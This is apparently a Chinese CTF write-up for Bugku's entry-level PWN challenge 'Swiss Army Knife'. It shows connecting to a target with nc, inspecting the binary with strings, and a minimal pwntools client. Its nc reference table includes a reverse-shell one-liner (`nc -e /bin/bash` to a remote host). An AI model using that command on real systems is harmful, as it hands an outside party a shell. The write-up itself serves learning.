---
title: Bugku 瑞士军刀 - PWN
date: 2026-10-12 22:36:00
updated: 2026-10-12 22:36:00
description: Bugku 基础 30 题 第 10 题：Bugku 瑞士军刀 - PWN
cover: 
top_img: 
tags:
  - Bugku
  - PWN
  - 基础30题
categories:
  - WriteUp
keywords: Bugku,CTF,WriteUp,PWN
---

## 1. 题目信息
- 平台：Bugku CTF
- 分类：PWN
- 难度：★☆☆☆☆（PWN 入门第一题）
- 题目地址：https://ctf.bugku.com/challenges/detail/id/96.html
- 附件：一个可执行文件（ELF）

## 2. 题目描述
"瑞士军刀"指 **nc（netcat）** —— 网络工具里的万能刀。
题目给一个 Linux 可执行程序 + 服务器 `IP:端口`，让你用 `nc` 连上去拿 flag。

## 3. 解题思路（一句话）
`nc IP 端口` 连上靶机，按程序提示输入，flag 就打印出来。

## 4. 详细步骤

### 4.1 先看题目给了什么
题目会给出：
- 靶机地址，例如 `114.67.246.176:16542`
- 一个附件，比如 `pwn1` / `瑞士军刀`

### 4.2 连上去（一行命令）
```bash
nc 114.67.246.176 16542
```

连上后程序会问你问题，比如让你输个数字或者随便回车，flag 直接打印：

```
输入任意字符:
hello
flag{xxxxxxxx}
```

> **Windows 用户注意**：Win10/11 自带 `nc`？不一定。
> 推荐下载 [netcat for Windows](https://eternallybored.org/misc/netcat/)，
> 或者用 **WSL / Git Bash / PowerShell 的 `Test-NetConnection`** 替代：
> ```powershell
> Test-NetConnection 114.67.246.176 -Port 16542
> ```
> 最省事的办法：用虚拟机或者装个 `ncat`（Nmap 自带）。

### 4.3 nc 常用参数（背下来很有用）
| 参数 | 作用 | 例子 |
|---|---|---|
| 无 | 连 TCP 端口 | `nc 1.2.3.4 9999` |
| `-v` | 显示连接详情 | `nc -v 1.2.3.4 9999` |
| `-l -p 4444` | 本地监听 4444 端口 | `nc -l -p 4444` |
| `-e /bin/bash` | 连上给 shell（反弹 shell） | `nc -e /bin/bash 1.2.3.4 4444` |
| `-u` | 用 UDP | `nc -u 1.2.3.4 53` |
| `-w 3` | 3 秒超时 | `nc -w 3 1.2.3.4 9999` |

### 4.4 看附件程序（可选，进阶）
下载附件后，在 Linux 里：

```bash
file 瑞士军刀          # 看是什么架构
chmod +x 瑞士军刀      # 加执行权限
./瑞士军刀             # 本地跑一下，看提示
strings 瑞士军刀 | grep flag   # 直接找字符串（有些题 flag 就在里面）
```

`strings` 是新手最爱：**很多简单 PWN / Reverse 题的 flag 明文字符串就在二进制里**。

## 5. 关键知识点
- **PWN** = 二进制漏洞利用，本质是"让程序干它本来不该干的事"（溢出、改写返回地址等）。
- 但这道题只是**入门**：让你熟悉 **nc 连靶机** 这个动作。
- 做 PWN 的标准流程：`file` → `checksec` → 本地跑 → `strings` → IDA/Ghidra 分析 → 写 exp → `nc` 打远程。
- **工具定位**：`nc` 是"瑞士军刀"，`pwntools` 是"写 exp 的 Python 库"。

### 5.1 pwntools 最小模板（以后会用到）
```python
from pwn import *

# 本地调试用 process('./瑞士军刀')，打远程用 remote
io = remote('114.67.246.176', 16542)
io.recvuntil(b':')          # 收到提示
io.sendline(b'hello')       # 发送内容
print(io.recvline())        # 收 flag
io.interactive()            # 交回控制权，方便手工继续交互
```

安装 pwntools：
```bash
pip install pwntools
```

## 6. 常见坑
- **Windows 没有原生 nc**，别死磕，用 WSL 或直接 `pip install pwntools` 走 Python。
- 端口连不上？靶机可能下线了，回题目页点一下"开启环境"。
- `strings` 搜不到 flag？那要正经逆向了，去看第 16 题"入门逆向"。

## 7. FLAG
```
flag{这里填你提交成功的真实 flag}
```

